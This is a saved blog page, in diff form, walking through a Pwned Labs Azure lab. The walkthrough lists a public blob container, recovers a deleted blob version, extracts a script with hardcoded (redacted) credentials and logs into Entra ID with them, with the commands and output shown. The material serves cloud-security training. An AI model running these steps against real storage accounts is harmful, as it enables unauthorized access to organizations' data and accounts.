@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Azure Blob Container to Initial Access | SecFortress</title>
+<meta name="keywords" content="Azure, Red Teaming, Entra-ID, Powershell">
+<meta name="description" content="Discover how Azure Blob Containers can be exploited for initial access in cloud environments and learn best practices to secure them">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/hacking/azure_blob_container_to_initial_access/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/azure_blob_container_to_initial_access/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/hacking/azure_blob_container_to_initial_access/">
+  <meta property="og:site_name" content="SecFortress">
+  <meta property="og:title" content="Azure Blob Container to Initial Access">
+  <meta property="og:description" content="Discover how Azure Blob Containers can be exploited for initial access in cloud environments and learn best practices to secure them">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hacking">
+    <meta property="article:published_time" content="2024-09-26T23:32:03+01:00">
+    <meta property="article:modified_time" content="2024-09-26T23:32:03+01:00">
+    <meta property="article:tag" content="Azure">
+    <meta property="article:tag" content="Red Teaming">
+    <meta property="article:tag" content="Entra-ID">
+    <meta property="article:tag" content="Powershell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Azure Blob Container to Initial Access">
+<meta name="twitter:description" content="Discover how Azure Blob Containers can be exploited for initial access in cloud environments and learn best practices to secure them">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Azure Blob Container to Initial Access",
+      "item": "http://localhost:1313/hacking/azure_blob_container_to_initial_access/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Azure Blob Container to Initial Access",
+  "name": "Azure Blob Container to Initial Access",
+  "description": "Discover how Azure Blob Containers can be exploited for initial access in cloud environments and learn best practices to secure them",
+  "keywords": [
+    "Azure", "Red Teaming", "Entra-ID", "Powershell"
+  ],
+  "articleBody": "Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nWalkThrough Started a new Azure red team lab series on @Pwnedlabs and it has been fun so far. Thanks to my very good friend, Ayush, who introduced me to this platform.\nAs the blog header says, we can go ahead and start this lab in which we are given a URL, Navigating to the URL, we can see that this is truly hosted on the Azure cloud service.\nPlatform as a service (PaaS) is a complete development and deployment environment in the cloud, with resources that enable you to deliver everything from simple cloud-based apps to sophisticated, cloud-enabled enterprise applications.\nViewing source code we can see that we have a blob URL, This allows for:\nThe storage and management of data, such as documents, images, videos, and backups. The Blob storage service is highly available and can be a cost-effective option. Azure Blob Storage is Microsoft’s cloud service for storing large amounts of unstructured data, such as text or binary files, that don’t fit into a specific data model. “Blob” stands for “binary large object.”\nIt is possible to verify if this endpoint is up by making the following requests, Note that you have to replace /static with /index.html :\nInvoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head StatusCode : 200 StatusDescription : OK Content : RawContent : HTTP/1.1 200 OK ETag: 0x8DBD1A84E6455C0 Server: Windows-Azure-Blob/1.0 Server: Microsoft-HTTPAPI/2.0 x-ms-request-id: 679bb941-301e-0015-523b-105b8c000000 x-ms-version: 2009-09-19 x-ms-lease-status: u… Headers : {[ETag, System.String[]], [Server, System.String[]], [x-ms-request-id, System.String[]], [x-ms-version, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 0 RelationLink : {} ❯ curl -I https://mbtwebsite.blob.core.windows.net/$web/index.html HTTP/1.1 400 One of the request inputs is out of range. Transfer-Encoding: chunked Server: Blob Service Version 1.0 Microsoft-HTTPAPI/2.0 x-ms-request-id: 87b5de6d-b01e-009d-3243-10be85000000 Date: Thu, 26 Sep 2024 18:41:58 GMT # Note : It is worth using 'powershell' or 'pwsh' in 'kali' We can go ahead and expand the Headers property as this should give us a clear view of this endpoint. You can also do this for the RawContent property.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress\u003e Invoke-WebRequest -Uri 'https://mbtwebsite.blob.core.windows.net/$web/index.html' -Method Head | Select-Object -ExpandProperty Headers Key Value --- ----- ETag {0x8DBD1A84E6455C0} Server {Windows-Azure-Blob/1.0, Microsoft-HTTPAPI/2.0} x-ms-request-id {9d1c2618-e01e-00bf-2042-107b9a000000} x-ms-version {2009-09-19} x-ms-lease-status {unlocked} x-ms-blob-type {BlockBlob} Date {Thu, 26 Sep 2024 18:31:40 GMT} Content-Length {782359} Content-Type {text/html} Content-MD5 {JSe+sM+pXGAEFInxDgv4CA==} Last-Modified {Fri, 20 Oct 2023 20:08:20 GMT} We can also look into each components of this blob URL at https://mbtwebsite.blob.core.windows.net/$web/index.html\nhttps: The protocol used. Azure Blob Service supports both http and https mbtwebsite: The name of the Azure Storage Account associated with the website. blob.core.windows.net: The Azure Blob Storage Service $web: The name of the container hosting the website, and it is situated within the storage account. (Fuzzable with ffuf) index.html: The web page being requested Note that the container is always bruteforce-able as shown in this blog using tools like ffuf and MicroBurst\nWe can then go ahead and look for sensitive public information on the container /$web with the default blob parameter ?restype=container\u0026comp=list by sending a HTTP requests to the Azure Storage REST API.\nAs shown above there is alot of data and this can be terrible to read, we can set a delimiter to read only directories : ?restype=container\u0026comp=list\u0026delimiter=%2F\nWe can also automate all this process by using Azure-CLI and other methods as specified in both of this blogs ; Blog1, Blog2.\n❯ az storage blob list --account-name mbtwebsite --container-name '$web' --output table However as shown in the above output there isn’t any sensitive file found yet, we can go ahead and dig deeper by checking if versioning has been enabled for the container, and if we see any previous versions of files.\n/?restype=container\u0026comp=list\u0026include=versions “Blob versioning is a useful feature as it allows point-in-time recovery of individual blobs. A file may no longer exist, but a version of the file will still be stored. Sometimes files are temporarily uploaded for transfer, or maybe deleted after they are found to contain sensitive data…” – PwnedLabs\nHowever as shown above trying to list previous versions using a browser isn’t successful, searching for this error on google i came across a solution from stackoverflow by using the Az-CLI method or curl with the x-ms-version header.\n❯ az rest --method get --url 'https://mbtwebsite.blob.core.windows.net/$web?restype=container\u0026comp=list\u0026include=versions' --headers \"x-ms-version=2019-10-10\" | xmlstarlet fo curl -H \"x-ms-version: 2019-10-10\" 'https://mbtwebsite.blob.core.windows.net/$web?restype=container\u0026comp=list\u0026include=versions' | xmlstarlet fo Using Azure-CLI :\nUsing curl :\nReason : The versions parameter is only supported by version 2019-12-12 and later so it must be specified in our request.\nAs we can see we got an extra scripts-transfer.zip file using this method, we can go ahead and download this using curl. Don’t forget to include the versionId parameter and the x-ms-version header in your request :\n❯ curl -H \"x-ms-version: 2019-12-12\" 'https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2024-03-29T20:55:40.8265593Z' --output scripts-transfer.zip % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1503 100 1503 0 0 111 0 0:00:13 0:00:13 --:--:-- 354 Then go ahead an unzip the files to a directory :\n❯ mkdir scripts ❯ unzip scripts-transfer.zip -d scripts Archive: scripts-transfer.zip inflating: scripts/entra_users.ps1 inflating: scripts/stale_computer_accounts.ps1 Checking the first powershell script we have credentials for the user marcus\n❯ \\cat entra_users.ps1 # Install the required modules if not already installed # Install-Module -Name Az -Force -Scope CurrentUser # Install-Module -Name MSAL.PS -Force -Scope CurrentUser # Import the required modules Import-Module Az Import-Module MSAL.PS # Define your Azure AD credentials $Username = \"marcus@megabigtech.com\" $Password = \"[REDACTED]\" | ConvertTo-SecureString -AsPlainText -Force $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password) # Authenticate to Azure AD using the specified credentials Connect-AzAccount -Credential $Credential # Define the Microsoft Graph API URL $GraphApiUrl = \"https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName\" # Retrieve the access token for Microsoft Graph $AccessToken = (Get-AzAccessToken -ResourceType MSGraph).Token # Create a headers hashtable with the access token $headers = @{ \"Authorization\" = \"Bearer $AccessToken\" \"ContentType\" = \"application/json\" } # Retrieve User Information and Last Sign-In Time using Microsoft Graph via PowerShell $response = Invoke-RestMethod -Uri $GraphApiUrl -Method Get -Headers $headers # Output the response (formatted as JSON) $response | ConvertTo-Json Go ahead and type the following command to initiate the authentication process to log into the Azure account we just discovered with your username and password.\n❯ az login For authentication context we can confirm that we truly have the Azure Account Details of our compromised user :\n❯ az account show { \"environmentName\": \"AzureCloud\", \"homeTenantId\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\", \"id\": \"ceff06cb-e29d-4486-a3ae-eaaec5689f94\", \"isDefault\": true, \"managedByTenants\": [], \"name\": \"Microsoft Azure Sponsorship\", \"state\": \"Enabled\", \"tenantDefaultDomain\": \"megabigtech.com\", \"tenantDisplayName\": \"Default Directory\", \"tenantId\": \"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\", \"user\": { \"name\": \"marcus@megabigtech.com\", \"type\": \"user\" } } You can then navigate to https://portal.azure.com/, to login to the web-based dashboard that manages all of the Azure resources.\nGo ahead and open up the Azure cloud shell with the console icon by the top right\nOnce this is done you should have a cloud console like the below\nUsing this cheatsheet for list of commands i was able to come up with the below command to list the properties of our current user.\nPS /home/marcus\u003e Connect-AzureAD PS /home/marcus\u003e Get-AzureADUser -ObjectId marcus@megabigtech.com | Select-Object -Property * --SNIP-- ObjectId : 41c178d3-c246-4c00-98f0-8113bd631676 ObjectType : User AccountEnabled : True AgeGroup : AssignedLicenses : {} AssignedPlans : {} City : CompanyName : ConsentProvidedForMinor : Country : CreationType : Department : DirSyncEnabled : DisplayName : Marcus Hutch FacsimileTelephoneNumber : GivenName : Marcus IsCompromised : ImmutableId : JobTitle : Flag: [REDACTED] LastDirSyncTime : LegalAgeGroupClassification : Mail : MailNickName : marcus Mobile : OnPremisesSecurityIdentifier : OtherMails : {} PasswordPolicies : PasswordProfile : PhysicalDeliveryOfficeName : PostalCode : PreferredLanguage : ProvisionedPlans : {} ProvisioningErrors : {} ProxyAddresses : {} RefreshTokensValidFromDateTime : 9/26/2024 9:04:50 PM ShowInAddressList : SignInNames : {} SipProxyAddress : State : StreetAddress : Surname : Hutch TelephoneNumber : UsageLocation : UserPrincipalName : marcus@megabigtech.com UserState : UserStateChangedOn : UserType : Member PS /home/marcus\u003e That would be all for today ( -_•)︻デ═一\nReferences \u0026 Mitigations Lab Link : https://pwnedlabs.io/labs/azure-blob-container-to-initial-access Security recommendations for Blob storage Securing Azure Blob Storage: Set-Up Guide Security best practices for Azure Blob Storage ",
+  "wordCount" : "1336",
+  "inLanguage": "en",
+  "datePublished": "2024-09-26T23:32:03+01:00",
+  "dateModified": "2024-09-26T23:32:03+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/azure_blob_container_to_initial_access/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortress",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Notes">
+                    <span>✍️ Notes</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Azure Blob Container to Initial Access
+    </h1>
+    <div class="post-description">
+      Discover how Azure Blob Containers can be exploited for initial access in cloud environments and learn best practices to secure them
+    </div>
+    <div class="post-meta"><span title='2024-09-26 23:32:03 +0100 WAT'>September 26, 2024</span>&nbsp;·&nbsp;<span>7 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#walkthrough"><strong>WalkThrough</strong></a></li>
+    <li><a href="#references--mitigations"><strong>References &amp; Mitigations</strong></a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>Note : This article was inspired by content from <a href="https://pwnedlabs.io/labs/azure-blob-container-to-initial-access">Pwned Labs</a>. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.</strong></p>
+<h2 id="walkthrough"><strong>WalkThrough</strong><a hidden class="anchor" aria-hidden="true" href="#walkthrough">#</a></h2>
+<p>Started a new <strong>Azure</strong> red team lab series on <strong><a href="https://pwnedlabs.io/">@Pwnedlabs</a></strong> and it has been fun so far. Thanks to my very good friend, <a href="https://x.com/Hac10101">Ayush</a>, who introduced me to this platform.</p>
+<p>As the blog header says, we can go ahead and start this lab in which we are given a URL, Navigating to the URL, we can see that this is truly hosted on the Azure cloud service.</p>
+<p><img loading="lazy" src="https://i.imgur.com/yTmThdZ.png"></p>
+<blockquote>
+<p>Platform as a service (PaaS) is <strong>a complete development and deployment environment in the cloud</strong>, with resources that enable you to deliver everything from simple cloud-based apps to sophisticated, cloud-enabled enterprise applications.</p>
+</blockquote>
+<p>Viewing source code we can see that we have a blob URL, This allows for:</p>
+<ul>
+<li>The storage and management of data, such as documents, images, videos, and backups.</li>
+<li>The Blob storage service is highly available and can be a cost-effective option.</li>
+</ul>
+<p><img loading="lazy" src="https://i.imgur.com/9dtIqKO.png"></p>
+<blockquote>
+<p>Azure Blob Storage is Microsoft&rsquo;s cloud service for storing large amounts of unstructured data, such as text or binary files, that don&rsquo;t fit into a specific data model. &ldquo;Blob&rdquo; stands for &ldquo;binary large object.&rdquo;</p>
+</blockquote>
+<p>It is possible to verify if this endpoint is up by making the following requests, Note that you have to replace <code>/static</code> with <code>/index.html</code> :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s1">&#39;https://mbtwebsite.blob.core.windows.net/$web/index.html&#39;</span> <span class="n">-Method</span> <span class="n">Head</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">StatusCode</span>        <span class="err">:</span> <span class="mf">200</span>
+</span></span><span class="line"><span class="cl"><span class="n">StatusDescription</span> <span class="err">:</span> <span class="n">OK</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content</span>           <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">RawContent</span>        <span class="err">:</span> <span class="n">HTTP</span><span class="p">/</span><span class="mf">1.1</span> <span class="mf">200</span> <span class="n">OK</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">ETag</span><span class="err">:</span> <span class="n">0x8DBD1A84E6455C0</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">Server</span><span class="err">:</span> <span class="nb">Windows-Azure</span><span class="n">-Blob</span><span class="p">/</span><span class="mf">1.0</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">Server</span><span class="err">:</span> <span class="nb">Microsoft-HTTPAPI</span><span class="p">/</span><span class="mf">2.0</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">x-ms</span><span class="n">-request-id:</span> <span class="n">679bb941</span><span class="p">-</span><span class="n">301e</span><span class="p">-</span><span class="mf">0015</span><span class="p">-</span><span class="n">523b</span><span class="p">-</span><span class="n">105b8c000000</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">x-ms</span><span class="n">-version:</span> <span class="mf">2009</span><span class="p">-</span><span class="mf">09</span><span class="p">-</span><span class="mf">19</span>
+</span></span><span class="line"><span class="cl">                    <span class="nb">x-ms</span><span class="n">-lease-status:</span> <span class="n">u</span><span class="err">…</span>
+</span></span><span class="line"><span class="cl"><span class="n">Headers</span>           <span class="err">:</span> <span class="p">{[</span><span class="no">ETag, System.String[]], [Server, System.String[]</span><span class="p">],</span> <span class="p">[</span><span class="nb">x-ms</span><span class="n">-request-id</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">String</span><span class="p">[]],</span> <span class="p">[</span><span class="nb">x-ms</span><span class="n">-version</span><span class="p">,</span> <span class="n">System</span><span class="p">.</span><span class="n">String</span><span class="p">[]]</span><span class="err">…</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">Images</span>            <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">InputFields</span>       <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">Links</span>             <span class="err">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="n">RawContentLength</span>  <span class="err">:</span> <span class="mf">0</span>
+</span></span><span class="line"><span class="cl"><span class="n">RelationLink</span>      <span class="err">:</span> <span class="p">{}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ curl -I https://mbtwebsite.blob.core.windows.net/<span class="nv">$web</span>/index.html
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">400</span> One of the request inputs is out of range.
+</span></span><span class="line"><span class="cl">Transfer-Encoding: chunked
+</span></span><span class="line"><span class="cl">Server: Blob Service Version 1.0 Microsoft-HTTPAPI/2.0
+</span></span><span class="line"><span class="cl">x-ms-request-id: 87b5de6d-b01e-009d-3243-10be85000000
+</span></span><span class="line"><span class="cl">Date: Thu, <span class="m">26</span> Sep <span class="m">2024</span> 18:41:58 GMT
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Note : It is worth using &#39;powershell&#39; or &#39;pwsh&#39; in &#39;kali&#39;</span>
+</span></span></code></pre></div><p>We can go ahead and expand the <code>Headers</code> property as this should give us a clear view of this endpoint. You can also do this for the <code>RawContent</code> property.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">&gt;</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="s1">&#39;https://mbtwebsite.blob.core.windows.net/$web/index.html&#39;</span> <span class="n">-Method</span> <span class="n">Head</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Headers</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Key</span>               <span class="n">Value</span>
+</span></span><span class="line"><span class="cl"><span class="p">---</span>               <span class="p">-----</span>
+</span></span><span class="line"><span class="cl"><span class="n">ETag</span>              <span class="p">{</span><span class="n">0x8DBD1A84E6455C0</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">Server</span>            <span class="p">{</span><span class="nb">Windows-Azure</span><span class="n">-Blob</span><span class="p">/</span><span class="mf">1.0</span><span class="p">,</span> <span class="nb">Microsoft-HTTPAPI</span><span class="p">/</span><span class="mf">2.0</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">x-ms</span><span class="n">-request-id</span>   <span class="p">{</span><span class="n">9d1c2618-e01e</span><span class="p">-</span><span class="n">00bf</span><span class="p">-</span><span class="mf">2042</span><span class="p">-</span><span class="n">107b9a000000</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">x-ms</span><span class="n">-version</span>      <span class="p">{</span><span class="mf">2009</span><span class="p">-</span><span class="mf">09</span><span class="p">-</span><span class="mf">19</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">x-ms</span><span class="n">-lease-status</span> <span class="p">{</span><span class="n">unlocked</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">x-ms</span><span class="n">-blob-type</span>    <span class="p">{</span><span class="n">BlockBlob</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">Date</span>              <span class="p">{</span><span class="n">Thu</span><span class="p">,</span> <span class="mf">26</span> <span class="n">Sep</span> <span class="mf">2024</span> <span class="mf">18</span><span class="err">:</span><span class="mf">31</span><span class="err">:</span><span class="mf">40</span> <span class="n">GMT</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Content-Length</span>    <span class="p">{</span><span class="mf">782359</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Content-Type</span>      <span class="p">{</span><span class="n">text</span><span class="p">/</span><span class="n">html</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Content-MD5</span>       <span class="p">{</span><span class="n">JSe</span><span class="p">+</span><span class="n">sM</span><span class="p">+</span><span class="n">pXGAEFInxDgv4CA</span><span class="p">==}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Last-Modified</span>     <span class="p">{</span><span class="n">Fri</span><span class="p">,</span> <span class="mf">20</span> <span class="n">Oct</span> <span class="mf">2023</span> <span class="mf">20</span><span class="err">:</span><span class="mf">08</span><span class="err">:</span><span class="mf">20</span> <span class="n">GMT</span><span class="p">}</span>
+</span></span></code></pre></div><p>We can also look into each components of this blob URL at <a href="https://mbtwebsite.blob.core.windows.net/$web/index.html">https://mbtwebsite.blob.core.windows.net/$web/index.html</a></p>
+<pre tabindex="0"><code>https: The protocol used. Azure Blob Service supports both http and https
+
+
+mbtwebsite: The name of the Azure Storage Account associated with the website.
+
+
+blob.core.windows.net: The Azure Blob Storage Service
+
+
+$web: The name of the container hosting the website, and it is situated within the storage account. (Fuzzable with ffuf)
+
+
+index.html: The web page being requested
+</code></pre><blockquote>
+<p>Note that the container is always bruteforce-able as shown in this <a href="https://shellbr3ak.medium.com/first-time-hacking-the-cloud-205751a4c61">blog</a> using tools like <code>ffuf</code> and <code>MicroBurst</code></p>
+</blockquote>
+<p>We can then go ahead and look for sensitive public information on the container <code>/$web</code> with the default blob parameter <code>?restype=container&amp;comp=list</code>  by sending a HTTP requests to the Azure Storage REST API.</p>
+<p><img loading="lazy" src="https://i.imgur.com/A8vkDkL.png"></p>
+<p>As shown above there is alot of data and this can be terrible to read, we can set a delimiter to read only directories : <code>?restype=container&amp;comp=list&amp;delimiter=%2F</code></p>
+<p><img loading="lazy" src="https://i.imgur.com/eaHIlQ9.png"></p>
+<p>We can also automate all this process by using <code>Azure-CLI</code> and other methods as specified in both of this blogs ; <a href="https://edi.wang/post/2024/8/5/how-to-list-all-files-in-a-public-azure-storage-container">Blog1</a>, <a href="https://blog.ironmansoftware.com/azure-blobs-powershell/">Blog2</a>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ az storage blob list --account-name mbtwebsite --container-name <span class="s1">&#39;$web&#39;</span> --output table
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/dm0cUiN.jpeg"></p>
+<p>However as shown in the above output there isn&rsquo;t any sensitive file found yet, we can go ahead and dig deeper by checking if versioning has been enabled for the container, and if we see any previous versions of files.</p>
+<pre tabindex="0"><code>/?restype=container&amp;comp=list&amp;include=versions
+</code></pre><p><img loading="lazy" src="https://i.imgur.com/yeWq1Ix.png"></p>
+<blockquote>
+<p>&ldquo;Blob versioning is a useful feature as it allows point-in-time recovery of individual blobs. A file may no longer exist, but a version of the file will still be stored. Sometimes files are temporarily uploaded for transfer, or maybe deleted after they are found to contain sensitive data&hellip;&rdquo;   <em>&ndash; PwnedLabs</em></p>
+</blockquote>
+<p>However as shown above trying to list previous versions using a browser isn&rsquo;t successful, searching for this error on google i came across a solution from <a href="https://stackoverflow.com/a/77494363">stackoverflow</a> by using the <code>Az-CLI</code> method or <code>curl</code> with the <code>x-ms-version</code> header.</p>
+<pre tabindex="0"><code>❯ az rest --method get --url &#39;https://mbtwebsite.blob.core.windows.net/$web?restype=container&amp;comp=list&amp;include=versions&#39; --headers &#34;x-ms-version=2019-10-10&#34; | xmlstarlet fo
+
+curl -H &#34;x-ms-version: 2019-10-10&#34; &#39;https://mbtwebsite.blob.core.windows.net/$web?restype=container&amp;comp=list&amp;include=versions&#39; | xmlstarlet fo
+</code></pre><p><em><strong>Using Azure-CLI</strong></em> :</p>
+<p><img loading="lazy" src="https://i.imgur.com/aX7HzAM.png"></p>
+<p><em><strong>Using curl</strong></em> :</p>
+<p><img loading="lazy" src="https://i.imgur.com/Wh58T8T.jpeg"></p>
+<blockquote>
+<p>Reason : The <code>versions</code> parameter is only supported by version 2019-12-12 and later so it must be specified in our request.</p>
+</blockquote>
+<p>As we can see we got an extra <code>scripts-transfer.zip</code> file using this method, we can go ahead and download this using <code>curl</code>. Don&rsquo;t forget to include the <code>versionId</code> parameter and the <code>x-ms-version</code> header in your request :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ curl -H <span class="s2">&#34;x-ms-version: 2019-12-12&#34;</span> <span class="s1">&#39;https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2024-03-29T20:55:40.8265593Z&#39;</span> --output scripts-transfer.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span class="line"><span class="cl">                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span class="line"><span class="cl"><span class="m">100</span>  <span class="m">1503</span>  <span class="m">100</span>  <span class="m">1503</span>    <span class="m">0</span>     <span class="m">0</span>    <span class="m">111</span>      <span class="m">0</span>  0:00:13  0:00:13 --:--:--   <span class="m">354</span>
+</span></span></code></pre></div><p>Then go ahead an unzip the files to a directory :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ mkdir scripts
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ unzip scripts-transfer.zip -d scripts
+</span></span><span class="line"><span class="cl">Archive:  scripts-transfer.zip
+</span></span><span class="line"><span class="cl">  inflating: scripts/entra_users.ps1  
+</span></span><span class="line"><span class="cl">  inflating: scripts/stale_computer_accounts.ps1  
+</span></span></code></pre></div><p>Checking the first powershell script we have credentials for the user <code>marcus</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="err">❯</span> <span class="p">\</span><span class="nb">cat </span><span class="n">entra_users</span><span class="p">.</span><span class="py">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Install the required modules if not already installed</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Install-Module -Name Az -Force -Scope CurrentUser</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Install-Module -Name MSAL.PS -Force -Scope CurrentUser</span>
+</span></span><span class="line"><span class="cl">
